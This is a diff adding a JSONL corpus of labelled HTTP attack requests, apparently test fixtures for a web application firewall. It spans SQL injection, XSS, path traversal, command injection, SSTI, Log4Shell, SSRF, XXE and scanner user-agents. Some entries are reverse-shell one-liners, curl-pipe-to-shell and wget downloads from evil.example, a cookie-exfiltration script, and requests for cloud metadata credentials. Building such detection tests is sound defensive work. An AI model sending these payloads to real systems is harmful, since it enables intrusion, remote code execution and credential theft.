@@ -1,0 +1,107 @@
+{"name":"classic tautology","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' OR '1'='1"]],"headers":{},"content_type":"","body":""}
+{"name":"tautology with comment","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","admin'--"]],"headers":{},"content_type":"","body":""}
+{"name":"numeric tautology","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1 OR 1=1"]],"headers":{},"content_type":"","body":""}
+{"name":"union select","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1 UNION SELECT username, password FROM users--"]],"headers":{},"content_type":"","body":""}
+{"name":"union all null padding","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","' UNION ALL SELECT NULL,NULL,NULL--"]],"headers":{},"content_type":"","body":""}
+{"name":"stacked drop table","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1; DROP TABLE orders;--"]],"headers":{},"content_type":"","body":""}
+{"name":"time-based pg_sleep","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' AND (SELECT 1 FROM pg_sleep(5))--"]],"headers":{},"content_type":"","body":""}
+{"name":"time-based sleep mysql","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' AND SLEEP(5)#"]],"headers":{},"content_type":"","body":""}
+{"name":"boolean blind substring","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' AND SUBSTRING(version(),1,1)='P"]],"headers":{},"content_type":"","body":""}
+{"name":"error-based cast","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' AND 1=CAST((SELECT version()) AS int)--"]],"headers":{},"content_type":"","body":""}
+{"name":"inline comment evasion","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1'/**/UNION/**/SELECT/**/1,2--"]],"headers":{},"content_type":"","body":""}
+{"name":"case mixing evasion","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' uNiOn SeLeCt 1,2--"]],"headers":{},"content_type":"","body":""}
+{"name":"information_schema","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","' UNION SELECT table_name FROM information_schema.tables--"]],"headers":{},"content_type":"","body":""}
+{"name":"pg catalog","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","' UNION SELECT usename FROM pg_user--"]],"headers":{},"content_type":"","body":""}
+{"name":"hex encoded string","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1 UNION SELECT 0x61646d696e"]],"headers":{},"content_type":"","body":""}
+{"name":"having/group by probe","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' GROUP BY 1 HAVING 1=1--"]],"headers":{},"content_type":"","body":""}
+{"name":"order by column probe","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","1' ORDER BY 10--"]],"headers":{},"content_type":"","body":""}
+{"name":"copy to program (pg rce)","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","'; COPY (SELECT '') TO PROGRAM 'id'--"]],"headers":{},"content_type":"","body":""}
+{"name":"sqli in path","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products/1%27%20OR%20%271%27=%271","query":[],"headers":{},"content_type":"","body":""}
+{"name":"sqli in json value","category":"sqli","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"product_id\":\"1' OR '1'='1\",\"qty\":1}"}
+{"name":"sqli union in json","category":"sqli","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"search\":\"x' UNION SELECT password FROM users--\"}"}
+{"name":"sqli in login form","category":"sqli","kind":"attack","method":"POST","path":"/api/v1/auth/login","query":[],"headers":{},"content_type":"application/x-www-form-urlencoded","body":"email=admin%40example.in%27%20OR%201%3D1--"}
+{"name":"sqli in cookie","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"Cookie":"session=1' OR '1'='1"},"content_type":"","body":""}
+{"name":"sqli in user-agent","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"Mozilla' UNION SELECT 1--"},"content_type":"","body":""}
+{"name":"sqli in referer","category":"sqli","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"Referer":"https://x.com/?id=1' OR '1'='1"},"content_type":"","body":""}
+{"name":"script tag","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<script>alert(1)</script>"]],"headers":{},"content_type":"","body":""}
+{"name":"img onerror","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<img src=x onerror=alert(1)>"]],"headers":{},"content_type":"","body":""}
+{"name":"svg onload","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<svg/onload=alert(document.cookie)>"]],"headers":{},"content_type":"","body":""}
+{"name":"javascript uri","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","javascript:alert(1)"]],"headers":{},"content_type":"","body":""}
+{"name":"iframe srcdoc","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<iframe srcdoc='<script>alert(1)</script>'>"]],"headers":{},"content_type":"","body":""}
+{"name":"body onload","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<body onload=alert(1)>"]],"headers":{},"content_type":"","body":""}
+{"name":"event handler no tag","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","\" onmouseover=\"alert(1)"]],"headers":{},"content_type":"","body":""}
+{"name":"data uri html","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="]],"headers":{},"content_type":"","body":""}
+{"name":"case and whitespace evasion","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<ScRiPt >alert(1)</sCrIpT >"]],"headers":{},"content_type":"","body":""}
+{"name":"html entity evasion","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<a href=\"&#106;avascript:alert(1)\">x</a>"]],"headers":{},"content_type":"","body":""}
+{"name":"document.cookie exfil","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<script>fetch('//evil.example/'+document.cookie)</script>"]],"headers":{},"content_type":"","body":""}
+{"name":"template literal","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<script>alert`1`</script>"]],"headers":{},"content_type":"","body":""}
+{"name":"stored xss in review","category":"xss","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"review\":\"<script>alert(1)</script>\",\"rating\":5}"}
+{"name":"xss in address field","category":"xss","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"address_line1\":\"<img src=x onerror=alert(1)>\"}"}
+{"name":"xss in referer","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"Referer":"<script>alert(1)</script>"},"content_type":"","body":""}
+{"name":"xss in user-agent","category":"xss","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"<svg onload=alert(1)>"},"content_type":"","body":""}
+{"name":"dot-dot-slash passwd","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/files/../../../../etc/passwd","query":[],"headers":{},"content_type":"","body":""}
+{"name":"url-encoded traversal","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/files/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd","query":[],"headers":{},"content_type":"","body":""}
+{"name":"double-encoded traversal","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/files/%252e%252e%252f%252e%252e%252fetc%252fpasswd","query":[],"headers":{},"content_type":"","body":""}
+{"name":"backslash traversal","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/files/..%5c..%5c..%5cwindows%5cwin.ini","query":[],"headers":{},"content_type":"","body":""}
+{"name":"proc self environ","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/files/../../proc/self/environ","query":[],"headers":{},"content_type":"","body":""}
+{"name":"traversal in query","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","../../../../etc/shadow"]],"headers":{},"content_type":"","body":""}
+{"name":"null byte","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","../../etc/passwd%00.png"]],"headers":{},"content_type":"","body":""}
+{"name":"k8s service account token","category":"lfi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","../../../var/run/secrets/kubernetes.io/serviceaccount/token"]],"headers":{},"content_type":"","body":""}
+{"name":".env file","category":"lfi","kind":"attack","method":"GET","path":"/.env","query":[],"headers":{},"content_type":"","body":""}
+{"name":".git config","category":"lfi","kind":"attack","method":"GET","path":"/.git/config","query":[],"headers":{},"content_type":"","body":""}
+{"name":"backup file","category":"lfi","kind":"attack","method":"GET","path":"/config.php.bak","query":[],"headers":{},"content_type":"","body":""}
+{"name":"http include","category":"rfi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","http://evil.example/shell.txt?"]],"headers":{},"content_type":"","body":""}
+{"name":"php wrapper","category":"rfi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","php://filter/convert.base64-encode/resource=index.php"]],"headers":{},"content_type":"","body":""}
+{"name":"file wrapper","category":"rfi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","file:///etc/passwd"]],"headers":{},"content_type":"","body":""}
+{"name":"semicolon id","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","; id"]],"headers":{},"content_type":"","body":""}
+{"name":"pipe cat passwd","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","| cat /etc/passwd"]],"headers":{},"content_type":"","body":""}
+{"name":"backticks","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","`whoami`"]],"headers":{},"content_type":"","body":""}
+{"name":"dollar subshell","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","$(curl http://evil.example/x.sh | sh)"]],"headers":{},"content_type":"","body":""}
+{"name":"and-and wget","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","&& wget http://evil.example/m -O /tmp/m"]],"headers":{},"content_type":"","body":""}
+{"name":"reverse shell","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]],"headers":{},"content_type":"","body":""}
+{"name":"nc listener","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","; nc -e /bin/sh 10.0.0.1 4444"]],"headers":{},"content_type":"","body":""}
+{"name":"windows cmd","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","& type C:\\Windows\\win.ini"]],"headers":{},"content_type":"","body":""}
+{"name":"powershell","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","; powershell -enc SQBFAFgA"]],"headers":{},"content_type":"","body":""}
+{"name":"cmdi in json","category":"cmdi","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"phone\":\"9999999999; cat /etc/passwd\"}"}
+{"name":"shellshock user-agent","category":"cmdi","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"() { :; }; /bin/bash -c 'cat /etc/passwd'"},"content_type":"","body":""}
+{"name":"jinja config","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{config.items()}}"]],"headers":{},"content_type":"","body":""}
+{"name":"jinja rce","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{''.__class__.__mro__[1].__subclasses__()}}"]],"headers":{},"content_type":"","body":""}
+{"name":"java el","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${T(java.lang.Runtime).getRuntime().exec('id')}"]],"headers":{},"content_type":"","body":""}
+{"name":"go template","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ .Env }}"]],"headers":{},"content_type":"","body":""}
+{"name":"jndi in user-agent","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"content_type":"","body":""}
+{"name":"obfuscated jndi","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"X-Api-Version":"${${lower:j}ndi:${lower:l}dap://evil.example/a}"},"content_type":"","body":""}
+{"name":"jndi in query","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${jndi:rmi://evil.example/x}"]],"headers":{},"content_type":"","body":""}
+{"name":"jndi in json","category":"log4shell","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"name\":\"${jndi:dns://evil.example/a}\"}"}
+{"name":"azure imds","category":"ssrf","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","http://169.254.169.254/metadata/instance?api-version=2021-02-01"]],"headers":{},"content_type":"","body":""}
+{"name":"aws imds","category":"ssrf","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","http://169.254.169.254/latest/meta-data/iam/security-credentials/"]],"headers":{},"content_type":"","body":""}
+{"name":"gopher redis","category":"ssrf","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","gopher://127.0.0.1:6379/_FLUSHALL"]],"headers":{},"content_type":"","body":""}
+{"name":"localhost admin","category":"ssrf","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","http://127.0.0.1:8080/admin"]],"headers":{},"content_type":"","body":""}
+{"name":"ssrf in image url","category":"ssrf","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"image_url\":\"http://169.254.169.254/metadata/identity/oauth2/token\"}"}
+{"name":"file entity","category":"xxe","kind":"attack","method":"POST","path":"/api/v1/import","query":[],"headers":{},"content_type":"application/xml","body":"<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>"}
+{"name":"remote dtd","category":"xxe","kind":"attack","method":"POST","path":"/api/v1/import","query":[],"headers":{},"content_type":"application/xml","body":"<?xml version=\"1.0\"?><!DOCTYPE r SYSTEM \"http://evil.example/evil.dtd\"><r/>"}
+{"name":"billion laughs","category":"xxe","kind":"attack","method":"POST","path":"/api/v1/import","query":[],"headers":{},"content_type":"application/xml","body":"<?xml version=\"1.0\"?><!DOCTYPE l [<!ENTITY a \"aaaa\"><!ENTITY b \"&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;\">]><l>&c;</l>"}
+{"name":"mongo gt operator","category":"nosqli","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"email\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}"}
+{"name":"mongo where js","category":"nosqli","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"$where\":\"sleep(5000)\"}"}
+{"name":"operator in query","category":"nosqli","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","[$ne]=1"]],"headers":{},"content_type":"","body":""}
+{"name":"php tag","category":"codei","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","<?php system($_GET['c']); ?>"]],"headers":{},"content_type":"","body":""}
+{"name":"php eval","category":"codei","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","eval(base64_decode('cGhwaW5mbygpOw=='))"]],"headers":{},"content_type":"","body":""}
+{"name":"node child_process","category":"codei","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","require('child_process').exec('id')"]],"headers":{},"content_type":"","body":""}
+{"name":"prototype pollution","category":"codei","kind":"attack","method":"POST","path":"/api/v1/cart/items","query":[],"headers":{},"content_type":"application/json","body":"{\"__proto__\":{\"isAdmin\":true}}"}
+{"name":"java deserialization b64","category":"codei","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ=="]],"headers":{},"content_type":"","body":""}
+{"name":"crlf header injection","category":"protocol","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","x%0d%0aSet-Cookie:%20admin=true"]],"headers":{},"content_type":"","body":""}
+{"name":"crlf in path","category":"protocol","kind":"attack","method":"GET","path":"/api/v1/products%0d%0aX-Injected:%201","query":[],"headers":{},"content_type":"","body":""}
+{"name":"request smuggling te","category":"protocol","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"Transfer-Encoding":"chunked, identity"},"content_type":"","body":""}
+{"name":"TRACE method","category":"protocol","kind":"attack","method":"TRACE","path":"/api/v1/products","query":[],"headers":{},"content_type":"","body":""}
+{"name":"TRACK method","category":"protocol","kind":"attack","method":"TRACK","path":"/api/v1/products","query":[],"headers":{},"content_type":"","body":""}
+{"name":"made-up method","category":"protocol","kind":"attack","method":"FOOBAR","path":"/api/v1/products","query":[],"headers":{},"content_type":"","body":""}
+{"name":"content-type abuse","category":"protocol","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"Content-Type":"application/x-evil-type"},"content_type":"","body":""}
+{"name":"sqlmap","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"sqlmap/1.8.4#stable (https://sqlmap.org)"},"content_type":"","body":""}
+{"name":"nikto","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:000001)"},"content_type":"","body":""}
+{"name":"nuclei","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"},"content_type":"","body":""}
+{"name":"masscan","category":"scanner","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"masscan/1.3 (https://github.com/robertdavidgraham/masscan)"},"content_type":"","body":""}
+{"name":"wp-admin probe","category":"scanner","kind":"attack","method":"GET","path":"/wp-admin/admin-ajax.php","query":[],"headers":{},"content_type":"","body":""}
+{"name":"phpmyadmin probe","category":"scanner","kind":"attack","method":"GET","path":"/phpmyadmin/index.php","query":[],"headers":{},"content_type":"","body":""}
+{"name":"actuator probe","category":"scanner","kind":"attack","method":"GET","path":"/actuator/env","query":[],"headers":{},"content_type":"","body":""}
+{"name":"session fixation","category":"session","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","PHPSESSID=attacker-fixed-id"]],"headers":{},"content_type":"","body":""}
+{"name":"ldap injection","category":"misc","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","*)(uid=*))(|(uid=*"]],"headers":{},"content_type":"","body":""}
+{"name":"xpath injection","category":"misc","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","' or name()='username' or 'x'='y"]],"headers":{},"content_type":"","body":""}
